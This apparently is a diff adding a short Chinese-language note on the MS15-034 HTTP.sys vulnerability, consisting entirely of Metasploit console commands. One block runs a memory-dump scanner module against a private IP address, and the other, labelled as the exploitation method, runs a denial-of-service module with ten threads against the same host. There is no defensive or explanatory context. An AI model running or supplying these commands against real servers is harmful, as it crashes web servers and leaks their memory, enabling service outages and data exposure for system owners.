@@ -1,0 +1,11 @@
+验证漏洞的方法
+use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
+set rhosts 192.168.1.200
+run
+
+
+漏洞利用方法
+use auxiliary/dos/http/ms15_034_ulonglongadd
+set rhosts 192.168.1.200
+set threads 10
+run
